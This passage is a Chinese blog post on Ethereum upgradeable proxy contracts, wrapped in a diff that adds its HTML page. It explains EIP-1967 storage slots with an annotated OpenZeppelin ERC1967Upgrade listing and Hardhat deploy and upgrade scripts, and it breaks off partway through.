@@ -1,0 +1,1008 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/tou.png">
+  <link rel="icon" href="/img/tou.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#957174">
+  <meta name="author" content="Sissice">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="包括 EIP1967、透明代理模式、UUPS、Beacon、EIP1167、钻石协议，以及相关漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="代理合约学习笔记">
+<meta property="og:url" content="http://example.com/2022/11/13/upgradeable/index.html">
+<meta property="og:site_name" content="Sissice&#39;s Blog">
+<meta property="og:description" content="包括 EIP1967、透明代理模式、UUPS、Beacon、EIP1167、钻石协议，以及相关漏洞">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2022/11/13/upgradeable/image-20221104173206225.png">
+<meta property="og:image" content="http://example.com/2022/11/13/upgradeable/image-20221104173019245.png">
+<meta property="og:image" content="http://example.com/2022/11/13/upgradeable/image-20221104171454827.png">
+<meta property="og:image" content="http://example.com/2022/11/13/upgradeable/image-20221104172156181.png">
+<meta property="og:image" content="http://example.com/2022/11/13/upgradeable/image-20221104215922504.png">
+<meta property="og:image" content="http://example.com/2022/11/13/upgradeable/erc-1167.png">
+<meta property="og:image" content="http://example.com/2022/11/13/upgradeable/473b432f25d2060d65f16d75435d1aa7dce2a058.png">
+<meta property="og:image" content="http://example.com/2022/11/13/upgradeable/image-20221112214123081.png">
+<meta property="og:image" content="http://example.com/2022/11/13/upgradeable/image-20221112214601260.png">
+<meta property="og:image" content="http://example.com/2022/11/13/upgradeable/image-20221112214906050.png">
+<meta property="article:published_time" content="2022-11-13T09:10:04.000Z">
+<meta property="article:modified_time" content="2022-11-13T09:14:09.546Z">
+<meta property="article:author" content="Sissice">
+<meta property="article:tag" content="Etherum">
+<meta property="article:tag" content="漏洞">
+<meta property="article:tag" content="EIP">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2022/11/13/upgradeable/image-20221104173206225.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>代理合约学习笔记 - Sissice&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Sissice&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/part1.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="代理合约学习笔记"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-11-13 17:10" pubdate>
+          2022年11月13日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          58k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          488 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">代理合约学习笔记</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="可升级模式"><a href="#可升级模式" class="headerlink" title="可升级模式"></a>可升级模式</h2><p><a target="_blank" rel="noopener" href="https://learnblockchain.cn/article/4936">Openzeppelin的三种代理模式 | 登链社区 | 区块链技术社区 (learnblockchain.cn)</a></p>
+<table>
+<thead>
+<tr>
+<th align="left"><strong>代理模式</strong></th>
+<th align="left"><strong>优点</strong></th>
+<th align="left"><strong>缺点</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">透明代理模式</td>
+<td align="left">实施起来相对容易和简单；被广泛使用的</td>
+<td align="left">相对而言，部署需要更多的气体</td>
+</tr>
+<tr>
+<td align="left">钻石代理模式</td>
+<td align="left">通过模块化帮助克服 24KB 的大小限制；增量可升级性</td>
+<td align="left">实施和维护更复杂；使用新术语，让新手更难理解；在撰写本文时，不受 Etherscan 等工具的支持</td>
+</tr>
+<tr>
+<td align="left">UUPS 代理模式</td>
+<td align="left">气体高效；删除可升级性的灵活性</td>
+<td align="left">不常用，因为它是相当新的；升级逻辑（访问控制）需要格外小心，因为它驻留在实施合同中</td>
+</tr>
+</tbody></table>
+<h3 id="EIP1967"><a href="#EIP1967" class="headerlink" title="EIP1967"></a>EIP1967</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p><a target="_blank" rel="noopener" href="https://eips.ethereum.org/EIPS/eip-1967">EIP1967官方文档</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/openzeppelin-contracts/tree/master/contracts/proxy/ERC1967">EIP1967代码</a></p>
+<p>该标准产生的背景是因为合约部署越来越多地采用路由合约跟逻辑合约分开部署的方式，这种方式的好处是在升级逻辑合约的时候，只需要将路由合约中逻辑合约的地址更改，就可以路由到新的逻辑合约上。</p>
+<p>EIP-1967的目的是规定一个通用的存储插槽使用标准，用于在代理合约中的特定位置存放逻辑合约的地址。其规定了如下特定的插槽：</p>
+<p>同时，EIP-1967在设计如下插槽的时，特意将计算得到的地址减去1，目的是为了不能知道哈希的前像，进一步减少可能的攻击机会。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs text">=&gt; 逻辑合约地址 <br>bytes32(uint256(keccak256(&quot;eip1967.proxy.implementation&quot;) - 1)) <br>更新该地址时，需要同时发出： <br>event Upgraded(address indexed implementation); <br> <br>=&gt; beacon地址 <br>bytes32(uint256(keccak256(&quot;eip1967.proxy.beacon&quot;) - 1)) <br>更新该地址时，需要发出： <br>event BeaconUpgraded(address indexed beacon); <br> <br>=&gt; admin 地址,所有代理的所有者，每个网络仅部署一个<br>bytes32(uint256(keccak256(&quot;eip1967.proxy.admin&quot;) - 1)) <br>更新该地址时，需要发出： <br>event AdminChanged(address indexed previousAdmin, address newAdmin); <br> <br></code></pre></td></tr></table></figure>
+
+<p>该标准是为了解决以下代理合约跟逻辑合约部署存在的问题。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Proxy&#123; <br> address public owner; <br> address public impl; <br> fallback() external payable&#123;&#125; <br> function updateTo(address _impl) external &#123;&#125; <br>&#125; <br> <br>contract Impl&#123; <br> uint256 public value_0; <br> uint256 public value_1; <br> function modify() public &#123; <br>  value_0 = 0; // 由于是delegatecall, 此时的owner会被设置为0； <br> &#125; <br>&#125; <br> <br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/13/upgradeable/image-20221104173206225.png" srcset="/img/loading.gif" lazyload alt="image-20221104173206225"></p>
+<h5 id="ERC1967Upgrade"><a href="#ERC1967Upgrade" class="headerlink" title="ERC1967Upgrade"></a>ERC1967Upgrade</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>// OpenZeppelin Contracts (last updated v4.5.0) (proxy/ERC1967/ERC1967Upgrade.sol)<br><br>pragma solidity ^0.8.2;<br><br>import &quot;../beacon/IBeacon.sol&quot;;<br>import &quot;../../interfaces/draft-IERC1822.sol&quot;;<br>import &quot;../../utils/Address.sol&quot;;<br>import &quot;../../utils/StorageSlot.sol&quot;;<br><br>/**<br> * @dev This abstract contract provides getters and event emitting update functions for<br> * https://eips.ethereum.org/EIPS/eip-1967[EIP1967] slots.<br> *<br> * _Available since v4.1._<br> *<br> * @custom:oz-upgrades-unsafe-allow delegatecall<br> */<br>abstract contract ERC1967Upgrade &#123;<br>    // This is the keccak-256 hash of &quot;eip1967.proxy.rollback&quot; subtracted by 1<br>    // 这是“eip1967.proxy.rollback”的 keccak-256 哈希减 1<br>    bytes32 private constant _ROLLBACK_SLOT = 0x4910fdfa16fed3260ed0e7147f7cc6da11a60208b5b9406d12a635614ffd9143;<br><br>    /**<br>     * @dev Storage slot with the address of the current implementation.<br>     * This is the keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1, and is<br>     * validated in the constructor.<br>     */<br>     // 带有当前实现地址的存储槽。这是“eip1967.proxy.implementation”的 keccak-256 哈希减 1，并在构造函数中验证。<br>    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;<br><br>    /**<br>     * @dev Emitted when the implementation is upgraded.<br>     */<br>    event Upgraded(address indexed implementation);<br><br>    /**<br>     * @dev Returns the current implementation address.<br>     */<br>    // 返回当前的逻辑合约地址。<br>    function _getImplementation() internal view returns (address) &#123;<br>        return StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value;<br>    &#125;<br><br>    /**<br>     * @dev Stores a new address in the EIP1967 implementation slot.<br>     */<br>    // 在 EIP1967 实现槽中存储一个新地址。 <br>    function _setImplementation(address newImplementation) private &#123;<br>        require(Address.isContract(newImplementation), &quot;ERC1967: new implementation is not a contract&quot;);<br>        StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value = newImplementation;<br>    &#125;<br><br>    /**<br>     * @dev Perform implementation upgrade<br>     *<br>     * Emits an &#123;Upgraded&#125; event.<br>     */<br>    //  执行逻辑合约升级操作<br>    function _upgradeTo(address newImplementation) internal &#123;<br>        _setImplementation(newImplementation);<br>        emit Upgraded(newImplementation);<br>    &#125;<br><br>    /**<br>     * @dev Perform implementation upgrade with additional setup call.<br>     *<br>     * Emits an &#123;Upgraded&#125; event.<br>     */<br>    //  执行逻辑合约升级操作，并额外使用 delegatecall 来调用传入的 data<br>    function _upgradeToAndCall(<br>        address newImplementation,<br>        bytes memory data,<br>        bool forceCall<br>    ) internal &#123;<br>        _upgradeTo(newImplementation);<br>        if (data.length &gt; 0 || forceCall) &#123;<br>            Address.functionDelegateCall(newImplementation, data);<br>        &#125;<br>    &#125;<br><br>    /**<br>     * @dev Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.<br>     *<br>     * Emits an &#123;Upgraded&#125; event.<br>     */<br>    // 执行逻辑合约升级操作，对 UUPS 代理进行安全检查，并额外使用 delegatecall 来调用传入的 data<br>    function _upgradeToAndCallUUPS(<br>        address newImplementation,<br>        bytes memory data,<br>        bool forceCall<br>    ) internal &#123;<br>        // Upgrades from old implementations will perform a rollback test. This test requires the new<br>        // implementation to upgrade back to the old, non-ERC1822 compliant, implementation. Removing<br>        // this special case will break upgrade paths from old UUPS implementation to new ones.<br>        //从旧实现升级将执行回滚测试。 此测试需要新的实施升级回旧的、不符合 ERC1822 的实施。 删除这种特殊情况将打破从旧 UUPS 实施到新 UUPS 实施的升级路径。<br>        if (StorageSlot.getBooleanSlot(_ROLLBACK_SLOT).value) &#123;<br>            _setImplementation(newImplementation);<br>        &#125; else &#123;<br>            try IERC1822Proxiable(newImplementation).proxiableUUID() returns (bytes32 slot) &#123;<br>                require(slot == _IMPLEMENTATION_SLOT, &quot;ERC1967Upgrade: unsupported proxiableUUID&quot;);<br>            &#125; catch &#123;<br>                revert(&quot;ERC1967Upgrade: new implementation is not UUPS&quot;);<br>            &#125;<br>            _upgradeToAndCall(newImplementation, data, forceCall);<br>        &#125;<br>    &#125;<br><br>    /**<br>     * @dev Storage slot with the admin of the contract.<br>     * This is the keccak-256 hash of &quot;eip1967.proxy.admin&quot; subtracted by 1, and is<br>     * validated in the constructor.<br>     */<br>    //这是“eip1967.proxy.admin”的 keccak-256 哈希减 1，并且是在构造函数中验证。 <br>    bytes32 internal constant _ADMIN_SLOT = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;<br><br>    /**<br>     * @dev Emitted when the admin account has changed.<br>     */<br>    event AdminChanged(address previousAdmin, address newAdmin);<br><br>    /**<br>     * @dev Returns the current admin.<br>     */<br>    // 返回当前管理员 <br>    function _getAdmin() internal view returns (address) &#123;<br>        return StorageSlot.getAddressSlot(_ADMIN_SLOT).value;<br>    &#125;<br><br>    /**<br>     * @dev Stores a new address in the EIP1967 admin slot.<br>     */<br>    //  添加新的管理员<br>    function _setAdmin(address newAdmin) private &#123;<br>        require(newAdmin != address(0), &quot;ERC1967: new admin is the zero address&quot;);<br>        StorageSlot.getAddressSlot(_ADMIN_SLOT).value = newAdmin;<br>    &#125;<br><br>    /**<br>     * @dev Changes the admin of the proxy.<br>     *<br>     * Emits an &#123;AdminChanged&#125; event.<br>     */<br>    // 更改管理员 <br>    function _changeAdmin(address newAdmin) internal &#123;<br>        emit AdminChanged(_getAdmin(), newAdmin);<br>        _setAdmin(newAdmin);<br>    &#125;<br><br>    /**<br>     * @dev The storage slot of the UpgradeableBeacon contract which defines the implementation for this proxy.<br>     * This is bytes32(uint256(keccak256(&#x27;eip1967.proxy.beacon&#x27;)) - 1)) and is validated in the constructor.<br>     */<br>    // UpgradeableBeacon 合约的存储槽，它定义了这个代理的实现。<br>    // 这是 bytes32(uint256(keccak256(&#x27;eip1967.proxy.beacon&#x27;)) - 1)) 并在构造函数中验证。<br>    bytes32 internal constant _BEACON_SLOT = 0xa3f0ad74e5423aebfd80d3ef4346578335a9a72aeaee59ff6cb3582b35133d50;<br><br>    /**<br>     * @dev Emitted when the beacon is upgraded.<br>     */<br>    event BeaconUpgraded(address indexed beacon);<br><br>    /**<br>     * @dev Returns the current beacon.<br>     */<br>    // 返回当前 beacon <br>    function _getBeacon() internal view returns (address) &#123;<br>        return StorageSlot.getAddressSlot(_BEACON_SLOT).value;<br>    &#125;<br><br>    /**<br>     * @dev Stores a new beacon in the EIP1967 beacon slot.<br>     */<br>    // 添加一个新的 beacon<br>    function _setBeacon(address newBeacon) private &#123;<br>        require(Address.isContract(newBeacon), &quot;ERC1967: new beacon is not a contract&quot;);<br>        require(<br>            Address.isContract(IBeacon(newBeacon).implementation()),<br>            &quot;ERC1967: beacon implementation is not a contract&quot;<br>        );<br>        StorageSlot.getAddressSlot(_BEACON_SLOT).value = newBeacon;<br>    &#125;<br><br>    /**<br>     * @dev Perform beacon upgrade with additional setup call. Note: This upgrades the address of the beacon, it does<br>     * not upgrade the implementation contained in the beacon (see &#123;UpgradeableBeacon-_setImplementation&#125; for that).<br>     *<br>     * Emits a &#123;BeaconUpgraded&#125; event.<br>     */<br>    // 通过额外的delegatecall调用执行信标升级。 注意：这会升级信标的地址，它不会升级信标中包含的实现（参见&#123;UpgradeableBeacon-_setImplementation&#125;）。<br>    function _upgradeBeaconToAndCall(<br>        address newBeacon,<br>        bytes memory data,<br>        bool forceCall<br>    ) internal &#123;<br>        _setBeacon(newBeacon);<br>        emit BeaconUpgraded(newBeacon);<br>        if (data.length &gt; 0 || forceCall) &#123;<br>            Address.functionDelegateCall(IBeacon(newBeacon).implementation(), data);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p><strong>应用</strong></p>
+<p><a target="_blank" rel="noopener" href="https://dev.to/yakult/tutorial-write-upgradeable-smart-contract-proxy-contract-with-openzeppelin-1916">https://dev.to/yakult/tutorial-write-upgradeable-smart-contract-proxy-contract-with-openzeppelin-1916</a></p>
+<p><a target="_blank" rel="noopener" href="https://eth.antcave.club/solidity-1">https://eth.antcave.club/solidity-1</a></p>
+<p><a target="_blank" rel="noopener" href="https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable">https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable</a></p>
+<p>部署和获得逻辑合约地址</p>
+<p>可以在区块链浏览器查看<a target="_blank" rel="noopener" href="https://goerli.etherscan.io/address/0xa9e8517c61820d4a35592169e851d4a2719afb8a#code">https://goerli.etherscan.io/address/0xa9e8517c61820d4a35592169e851d4a2719afb8a#code</a></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>&#123;<br><br>    <span class="hljs-keyword">const</span> Box = <span class="hljs-keyword">await</span> ethers.getContractFactory(<span class="hljs-string">&quot;Box&quot;</span>)<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Deploying Box...&quot;</span>)<br>    <span class="hljs-comment">// 部署可升级的合约，使用 deployProxy()</span><br>    <span class="hljs-keyword">const</span> box = <span class="hljs-keyword">await</span> upgrades.deployProxy(Box,[<span class="hljs-number">42</span>], &#123; <span class="hljs-attr">initializer</span>: <span class="hljs-string">&#x27;store&#x27;</span> &#125;)<br><br>    <span class="hljs-built_in">console</span>.log(box.address,<span class="hljs-string">&quot; box(proxy) address&quot;</span>)<br><br>    <span class="hljs-keyword">const</span> receipt = <span class="hljs-keyword">await</span> box.deployTransaction.wait(<span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-keyword">await</span> upgrades.erc1967.getImplementationAddress(box.address),<span class="hljs-string">&quot; getImplementationAddress&quot;</span>)<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-keyword">await</span> upgrades.erc1967.getAdminAddress(box.address),<span class="hljs-string">&quot; getAdminAddress&quot;</span>)<br>&#125;<br><br>main().catch(<span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> &#123;<br>    <span class="hljs-built_in">console</span>.error(error)<br>    process.exitCode = <span class="hljs-number">1</span><br>&#125;)<br></code></pre></td></tr></table></figure>
+
+<p>升级</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs solidity">const proxyAddress = &#x27;0x9fe46736679d2d9a65f0992f2272de9f3c7fa6e0&#x27;<br><br>async function main() &#123;<br>    console.log(proxyAddress,&quot; original Box(proxy) address&quot;)<br>    const BoxV2 = await ethers.getContractFactory(&quot;BoxV2&quot;)<br>    console.log(&quot;upgrade to BoxV2...&quot;)<br>    const boxV2 = await upgrades.upgradeProxy(proxyAddress, BoxV2)<br>    console.log(boxV2.address,&quot; BoxV2 address(should be the same)&quot;)<br><br>    console.log(await upgrades.erc1967.getImplementationAddress(boxV2.address),&quot; getImplementationAddress&quot;)<br>    console.log(await upgrades.erc1967.getAdminAddress(boxV2.address), &quot; getAdminAddress&quot;)<br>&#125;<br><br>main().catch((error) =&gt; &#123;<br>    console.error(error)<br>    process.exitCode = 1<br>&#125;)<br></code></pre></td></tr></table></figure>
+
+<p>为了避免与代理后面的实现协定的存储变量发生冲突，我们使用<a target="_blank" rel="noopener" href="https://eips.ethereum.org/EIPS/eip-1967">EIP1967</a>存储槽。</p>
+<ul>
